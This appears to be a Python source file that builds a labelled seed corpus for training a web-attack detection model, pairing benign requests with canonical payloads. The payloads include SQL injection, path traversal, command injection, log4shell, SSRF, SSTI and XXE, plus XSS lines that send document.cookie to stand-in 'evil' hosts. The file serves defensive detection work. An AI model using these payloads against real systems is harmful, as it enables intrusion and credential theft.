"""
Expert seed corpus: a small but carefully curated set of labelled requests,
covering each attack vector in DIFFERENT request parts (path, query, body)
plus realistic benign traffic. The EXPERT model is trained on it (train.py --seed-only),
which is usable on day one and serves as the init_model for fine-tuning.

Each example is dict(path, query, body, label), where label 1 means attack and 0 means normal.
Stored as code rather than data, so it is easy to extend and review in a pull request.
"""
from __future__ import annotations

# --- attacks: canonical payloads by vector, distributed across request parts ---
ATTACKS = []

def _atk(path="/", query="", body=""):
    ATTACKS.append({"path": path, "query": query, "body": body, "label": 1})

# SQLi in query, body and path
_atk(query="id=1' OR '1'='1")
_atk(query="id=1 UNION SELECT username,password FROM users")
_atk(query="q=1; DROP TABLE users--")
_atk(query="id=1' AND SLEEP(5)--")
_atk(query="id=1 UNION ALL SELECT NULL,version()--")
_atk(query="user=admin'--")
_atk(body="username=admin'--&password=x")
_atk(body="id=1 OR 1=1")
_atk(body="q=1' UNION SELECT table_name FROM information_schema.tables--")
_atk(path="/product/1'%20OR%20'1'='1")
_atk(query="cat=1%27%20UNION%20SELECT%20password%20FROM%20users")  # url-encoded
_atk(query="id=1' WAITFOR DELAY '0:0:5'--")

# XSS — query, body, path
_atk(query="q=<script>alert(1)</script>")
_atk(query="search=<img src=x onerror=alert(document.cookie)>")
_atk(query="name=<svg/onload=alert(1)>")
_atk(query="q=%3Cscript%3Ealert(1)%3C/script%3E")
_atk(body="comment=<script>document.location='http://evil/'+document.cookie</script>")
_atk(body="bio=<iframe src=javascript:alert(1)>")
_atk(query="redirect=javascript:alert(1)")
_atk(path="/page/<script>alert(1)</script>")

# Path traversal / LFI
_atk(query="file=../../../../etc/passwd")
_atk(query="page=....//....//etc/passwd")
_atk(query="path=%2e%2e%2f%2e%2e%2fetc%2fpasswd")
_atk(query="template=php://filter/convert.base64-encode/resource=index")
_atk(path="/download/../../../../etc/shadow")
_atk(query="lang=../../../proc/self/environ")

# Command injection / RCE
_atk(query="host=127.0.0.1;cat /etc/passwd")
_atk(query="ip=8.8.8.8 && id")
_atk(query="cmd=$(whoami)")
_atk(body="name=test`id`")
_atk(query="x=|cat /etc/passwd")
_atk(query="payload=${jndi:ldap://evil/a}")  # log4shell

# SSRF
_atk(query="url=http://169.254.169.254/latest/meta-data/")
_atk(query="target=http://localhost:6379/")
_atk(query="img=http://metadata.google.internal/")
_atk(query="next=gopher://127.0.0.1:25/")

# RFI
_atk(query="page=http://evil.com/shell.txt")
_atk(query="include=https://evil/c99.php")

# SSTI
_atk(query="name={{7*7}}")
_atk(query="tpl=${7*7}")
_atk(body="msg=#{7*7}")

# XXE (in the body)
_atk(body='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>')

# Scanner / recon
_atk(path="/.env")
_atk(path="/.git/config")
_atk(path="/wp-admin/")
_atk(path="/phpmyadmin/")
_atk(path="/actuator/env")

# --- normal: realistic traffic ---
BENIGN = []

def _ok(path="/", query="", body=""):
    BENIGN.append({"path": path, "query": query, "body": body, "label": 0})

_ok(path="/")
_ok(path="/index.html")
_ok(path="/about")
_ok(path="/products", query="category=shoes&page=2")
_ok(path="/search", query="q=running+shoes&sort=price")
_ok(path="/api/v1/users", query="limit=20&offset=40")
_ok(path="/blog/2024/03/hello-world")
_ok(path="/cart", query="add=12345&qty=2")
_ok(path="/login", body="username=john.doe&password=hunter2")
_ok(path="/api/v1/orders", body='{"item_id":42,"quantity":1,"address":"123 Main St"}')
_ok(path="/profile", query="id=8821&tab=settings")
_ok(path="/images/logo.png")
_ok(path="/static/css/main.css")
_ok(path="/contact", body="name=Jane&email=jane@example.com&message=Hello, I have a question")
_ok(path="/api/search", query="query=laptop&brand=dell&min_price=500&max_price=1500")
_ok(path="/articles", query="tag=technology&author=smith")
_ok(path="/checkout", body='{"card":"tok_visa","amount":2999,"currency":"usd"}')
_ok(path="/news/article-12345-some-long-title-here")
_ok(path="/api/v2/products/9981/reviews", query="page=1&per_page=10")
_ok(path="/user/settings", body="theme=dark&language=en&notifications=true")
_ok(path="/feed", query="format=json&since=1700000000")
_ok(path="/docs/getting-started")
_ok(path="/api/v1/auth/refresh", body='{"refresh_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"}')
_ok(path="/catalog", query="color=blue&size=M&in_stock=1")
_ok(path="/comments", body="post_id=55&text=Great article, thanks for sharing!")

# --- extra attacks: the same vector in DIFFERENT parts, teaching localisation ---
_atk(path="/item/1%27%20OR%201=1--", query="", body="")          # sqli in the path
_atk(query="", body="q=1 UNION SELECT NULL,NULL,version()--")     # sqli in the body
_atk(path="/p", query="sort=name); DROP TABLE x--", body="")
_atk(query="", body="<script>fetch('//evil/'+document.cookie)</script>")  # xss in the body
_atk(path="/u/<svg onload=alert(1)>", query="", body="")          # xss in the path
_atk(query="redir=//evil.com%2f%2e%2e", body="")
_atk(query="", body="file=....//....//....//etc/passwd")          # lfi in the body
_atk(path="/api", query="host=127.0.0.1%0a%0dcat%20/etc/passwd")  # encoded cmdi in the query
_atk(path="/run/$(id)", query="", body="")                        # cmdi in the path
_atk(query="url=http://[::1]:80/admin", body="")                  # ssrf ipv6
_atk(query="callback=http://169.254.169.254/", body="")
_atk(query="next=dict://127.0.0.1:6379/info", body="")
_atk(query="", body="tpl={{config.__class__.__init__.__globals__}}")  # ssti in the body
_atk(query="name=#{T(java.lang.Runtime).getRuntime().exec('id')}")
_atk(query="", body='<!DOCTYPE x [<!ENTITY e SYSTEM "http://evil/x">]><x>&e;</x>')
_atk(path="/wp-content/uploads/shell.php", query="", body="")
_atk(query="q=1';SELECT pg_sleep(5)--", body="")
_atk(query="s=<iframe src=javascript:alert(document.domain)>", body="")

# --- extra normal: legitimate but suspicious-looking patterns, controlling false positives ---
_ok(path="/api/v1/notes", body="{\"title\":\"Meeting (Q3)\",\"body\":\"Don't forget: 1<2 and 3>2\"}")
_ok(path="/search", query="q=C%2B%2B+%26+Rust")                   # "C++ & Rust"
_ok(path="/calc", query="expr=2*(3%2B4)")                          # 2*(3+4)
_ok(path="/profile", query="bio=I+love+coding+%26+coffee")
_ok(path="/api/items", query="filter=price>100&price<500")        # legitimate comparisons
_ok(path="/comment", body="text=Use the <b>bold</b> tag for emphasis")  # legitimate discussion of HTML
_ok(path="/feedback", body='{"rating":5,"note":"100% recommend!"}')
_ok(path="/u/john-doe", query="ref=email")
_ok(path="/orders/8f3a2b1c-1234-4abc-9def-0123456789ab")          # uuid
_ok(path="/token/refresh", body="grant_type=refresh_token&token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9")
_ok(path="/math", query="formula=a%5E2+%2B+b%5E2+%3D+c%5E2")      # a^2 + b^2 = c^2
_ok(path="/search", query="q=how+to+select+from+a+dropdown")      # 'select' and 'from' in ordinary prose
_ok(path="/blog/sql-injection-explained")                         # 'sql' inside a slug is normal
_ok(path="/docs/path-traversal-guide")
_ok(path="/api/v1/files", query="name=report.pdf&folder=2024")


def dataset():
    """The full expert corpus: a list of dict(path, query, body, label)."""
    return ATTACKS + BENIGN


if __name__ == "__main__":
    d = dataset()
    pos = sum(x["label"] for x in d)
    print(f"expert corpus: {len(d)} examples ({pos} attacks / {len(d)-pos} normal)")
